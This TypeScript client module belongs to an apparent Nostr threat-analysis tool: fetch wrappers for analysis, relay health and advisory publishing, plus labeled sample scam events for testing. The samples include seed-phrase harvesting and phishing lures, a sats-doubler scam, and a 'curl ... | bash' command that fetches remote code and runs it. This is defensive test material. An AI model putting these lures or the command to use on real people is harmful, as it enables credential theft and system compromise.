import { ThreatAnalysisResult, NostrEvent, RelayStatus, AnalyzedEventRecord } from '../types/nostr.ts';

export async function analyzeContentApi(
  content: string,
  metadata?: { author?: string; eventId?: string; kind?: number }
): Promise<ThreatAnalysisResult> {
  const response = await fetch('/api/analyze', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content,
      eventId: metadata?.eventId,
      author: metadata?.author,
      kind: metadata?.kind,
    }),
  });

  if (!response.ok) {
    const errorData = await response.json().catch(() => ({ error: 'Analysis failed' }));
    throw new Error(errorData.error || `Failed with status ${response.status}`);
  }

  const data = await response.json();
  return data.result;
}

export async function fetchNostrEventApi(
  eventId: string,
  relays?: string[]
): Promise<{ event: NostrEvent; relaySource?: string }> {
  const response = await fetch('/api/nostr/fetch', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ eventId, relays }),
  });

  const data = await response.json();
  if (!response.ok || !data.success) {
    throw new Error(data.error || 'Failed to fetch event from Nostr relays');
  }

  return { event: data.event, relaySource: data.relaySource };
}

export async function fetchRecentRelayEventsApi(
  limit = 12,
  relays?: string[]
): Promise<NostrEvent[]> {
  const response = await fetch('/api/nostr/fetch', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ feed: true, limit, relays }),
  });

  const data = await response.json();
  if (!response.ok || !data.success) {
    throw new Error(data.error || 'Failed to fetch live events from relays');
  }

  return data.events || [];
}

export async function fetchRelayStatusesApi(customRelays?: string[]): Promise<RelayStatus[]> {
  const query = customRelays && customRelays.length > 0 ? `?urls=${encodeURIComponent(customRelays.join(','))}` : '';
  const response = await fetch(`/api/nostr/relays${query}`);
  const data = await response.json();
  if (!response.ok || !data.success) {
    throw new Error(data.error || 'Failed to query relay health');
  }
  return data.relays || [];
}

export async function retrySingleRelayApi(relayUrl: string): Promise<RelayStatus> {
  const response = await fetch('/api/nostr/relays/ping', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ url: relayUrl }),
  });
  const data = await response.json();
  if (!response.ok || !data.success) {
    throw new Error(data.error || 'Failed to ping relay');
  }
  return data.relay;
}

export async function publishSecurityAdvisoryApi(
  signedEvent: any,
  relays?: string[]
): Promise<{ success: boolean; results: { relay: string; status: 'ok' | 'failed'; reason?: string }[]; eventId?: string }> {
  const response = await fetch('/api/nostr/publish', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ signedEvent, relays }),
  });

  const data = await response.json();
  if (!response.ok) {
    throw new Error(data.error || 'Failed to publish advisory to relays');
  }

  return data;
}

export async function checkServerHealthApi(): Promise<{
  status: string;
  geminiConfigured: boolean;
  defaultRelays: string[];
}> {
  try {
    const res = await fetch('/api/health');
    if (!res.ok) throw new Error('Health check error');
    return await res.json();
  } catch (e) {
    return {
      status: 'offline',
      geminiConfigured: false,
      defaultRelays: ['wss://relay.damus.io', 'wss://nos.lol'],
    };
  }
}

// Sample real-world threat events for instant testing and evaluation (labeled clearly)
export const SAMPLE_SECURITY_SCENARIOS: {
  title: string;
  category: string;
  type: 'credential_theft' | 'phishing' | 'fake_support' | 'lightning_scam' | 'suspicious_url' | 'malicious_command' | 'clean';
  author: string;
  content: string;
  description: string;
}[] = [
  {
    title: 'Mnemonic Seed Phrase Harvesting',
    category: 'Credential Theft',
    type: 'credential_theft',
    author: 'npub1harvest4398fdskjfe983421190',
    description: 'Directly attempts to harvest 12/24-word seed phrases or nsec private keys under a protocol upgrade pretense.',
    content: 'Nostr Relay Upgrade Notice: To migrate your profile metadata to NIP-99 decentralized storage vaults, please export and enter your 12 words seed phrase or your nsec1 private key into the protocol migration tool: https://nostr-migration.xyz/vault.',
  },
  {
    title: 'Typo-Squatted Client Phishing',
    category: 'Phishing',
    type: 'phishing',
    author: 'npub1phish88319akldsf9120938481',
    description: 'Uses a lookalike typo-squatted domain targeting web nostr client users.',
    content: 'CRITICAL SECURITY: An emergency patch is required for all Damus and Amethyst web users. Login immediately at https://damus-login.online/patch to revoke compromised key permissions before your relays reject your events.',
  },
  {
    title: 'Fake Protocol Helpdesk Impersonation',
    category: 'Fake Support / Impersonation',
    type: 'fake_support',
    author: 'npub1support897fake99a09c88219488da',
    description: 'Impersonates official client support with urgency coercion and redirect to Telegram.',
    content: '⚠️ URGENT PROTOCOL ALERT: Official Nostr Support Desk detected unauthorized key derivations on your client. Your relay connectivity will be suspended within 6 hours. Connect with our Helpdesk Telegram t.me/nostr_emergency_desk or visit https://nostr-support.buzz for assistance.',
  },
  {
    title: 'Lightning Sats Doubler & Fake Airdrop',
    category: 'Payment Scam',
    type: 'lightning_scam',
    author: 'npub1airdrop488923019847129841',
    description: 'Prompts users to pay a Lightning invoice or send sats to receive double back.',
    content: '⚡ CELEBRATING 1M NOSTR USERS! ⚡ Flash Airdrop: Send 5,000 to 500,000 sats to our automated Lightning distribution node to double your balance instantly. Over 2.4 BTC disbursed! Pay invoice: lnbc50u1p3fakeinvoice99998234 or visit http://nostr-sats-doubler.buzz',
  },
  {
    title: 'Obfuscated Shortened Link with Suspicious TLD',
    category: 'Suspicious URL',
    type: 'suspicious_url',
    author: 'npub1linkmask8934201948712984102',
    description: 'Masks destination endpoint using URL shorteners combined with high-risk generic TLDs.',
    content: 'Check out the new decentralized media viewer for Nostr! Download the latest client build here: https://bit.ly/nostr-viewer-update which redirects to https://decentralized-vault.cfd/install.apk',
  },
  {
    title: 'Unsafe Piping Shell Execution Command',
    category: 'Malicious Command / Payload',
    type: 'malicious_command',
    author: 'npub1cli99812409812419082409812',
    description: 'Instructs users to run an unverified remote bash script via curl directly into their shell.',
    content: 'To fix Nostr relay sync stalls on your local node, run this one-line diagnostic tool in your terminal: curl -s https://relay-fix.top/patch.sh | bash and restart your daemon.',
  },
  {
    title: 'Authentic Protocol Release Announcement',
    category: 'Clean Protocol Broadcast',
    type: 'clean',
    author: 'npub180cvv07tjdrrgpa0j7j7tmn022ss5cjh7tmmvzspf8ism76973ps96f8w8',
    description: 'Normal open-source release announcement with legitimate GitHub commit references.',
    content: 'Just published nostr-tools v2.10.4! Fixes nip19 bech32 parsing for nprofile pointers and includes optimized WebSocket connection pooling. Check release notes and diff on GitHub: https://github.com/nbd-wtf/nostr-tools/releases/tag/v2.10.4',
  },
];

